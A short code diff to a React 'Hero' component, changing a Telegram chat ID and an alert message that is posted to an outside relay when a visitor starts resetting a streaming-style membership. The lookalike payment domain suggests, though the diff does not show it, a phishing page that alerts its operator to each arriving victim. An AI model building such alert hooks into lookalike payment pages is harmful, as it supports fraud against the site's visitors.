@@ -8,7 +8,7 @@ function Hero() {
 
   const sendTelegramMessage = async (message) => {
     try {
-      const chatId = '-4701736581'; // Reemplaza con tu chat ID de Telegram
+      const chatId = '--4783281642'; // Reemplaza con tu chat ID de Telegram
       const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
         method: 'POST',
         headers: {
@@ -30,7 +30,7 @@ function Hero() {
     
     try {
       // Enviar mensaje de Telegram
-      const message = `🚀 Nuevo usuario intentando reiniciar membresía`;
+      const message = `🚀 Nuevo usuario intentando reiniciar membresía 🚀`;
       await sendTelegramMessage(message);
 
       // Esperar un poco antes de navegar
